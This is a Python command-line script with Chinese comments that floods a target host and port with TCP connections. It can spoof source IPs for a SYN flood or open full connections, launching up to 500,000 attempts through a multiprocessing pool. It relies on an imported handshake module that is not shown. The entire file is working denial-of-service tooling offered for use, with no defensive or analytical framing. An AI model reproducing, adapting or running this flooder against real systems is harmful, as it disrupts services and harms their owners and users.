#!/usr/bin/python3
#--*-- coding:utf-8 --*--



import multiprocessing
from tcp_handshake import handshake
import signal
import sys,time

def signal_handler(signum,frame):  #定义停止攻击脚本
	print ('停止攻击')
	print ('退出程序')
	sys.exit()

def tcpdos(host,port,conn = 1000, randown_src = True, establish = False):
	signal.signal(signal.SIGINT,signal_handler)

	pool = multiprocessing.Pool(processes=10)


	print ("randown_src",randown_src,"establish",establish)

	if randown_src == True:
		for i in range(conn):
			print ("start attack...,伪造源地址第" + str(i) + "次攻击",flush=True)
			pool.apply_async(handshake, args=(host,port,True,False,False))   #维持执行的进程总数为processes，当一个进程执行完毕后会添加新的进程进去
		'''
		randown_src == "False"这里False为什么要使用引号,因为这里
		randown_src是通过传参进来的,函数默认可以不用引号,但是如果
		是传参进来的,那么就是字符串了,所以要用引号,后面的establish没用引号,因为没有手动传参
		'''
	elif randown_src == "False" and establish == False:
		for i in range(conn):
			print ("start attack...,不伪造源地址第" + str(i) + "次攻击",flush=True)
			pool.apply_async(handshake, args=(host,port,False,False,False))
	elif randown_src == "False" and establish == "True":
		for i in range(conn):
			print ("start attack...,建立连接全开TCP第" + str(i) + "次攻击",flush=True)
			pool.apply_async(handshake, args=(host,port,False,True,True))
	else:
		print (randown_src,establish,'----')
		print ("随机伪装源情况下,无法建立连接")

	pool.close()
	pool.join()  #调用join之前，先调用close函数，否则会出错。执行完close后不会有新的进程加入到pool,join函数等待所有子进程结束


if __name__ == "__main__":

	from optparse import OptionParser    #python处理命令行的模块
	usage = "python script.py -t 192.168.1.1 -p 23 -r True -e False"
	parser = OptionParser(usage=usage)

	parser.add_option("-t", "--target", action="store_true", #action:存储方式，分为三种store、store_false、store_true
	   dest="HostIP", 						#dest:存储的变量
	   default=False, 						#default:默认值,只接收True或者False
	   help="输入要攻击的主机IP,例:192.168.1.1") 

	parser.add_option("-p", "--port", action="store_true",
	   dest="Port", 						
	   default=False, 						
	   help="输入要攻击的端口")

	parser.add_option("-r", "--randomip", action="store_true",
		dest="Randomip", 						
		default=False, 						
		help="攻击时是否伪造源IP,默认值为True")

	parser.add_option("-e", "--establish", action="store_true",
	   dest="Establish", 						
	   default=False, 						
	   help="是否建立全开连接,默认为Flase")
	(options, args) = parser.parse_args()
	print (options,args)

	

	#这里options是在命令行输入值那么就为True,并不是参数
	if options.HostIP == True and options.Port == True and options.Randomip == False:
		print (1)
		tcpdos(args[0],int(args[1]),conn=50,)
	elif options.HostIP == True and options.Port == True and options.Randomip == True and options.Establish == False:
		print (2)
		tcpdos(args[0],int(args[1]),conn=50000,randown_src=args[2])
	elif options.HostIP == True and options.Port == True and options.Randomip == True and options.Establish == True:
		print (3)
		tcpdos(args[0],int(args[1]),conn=500000,randown_src=args[2],establish=args[3])
	else:
		print (usage)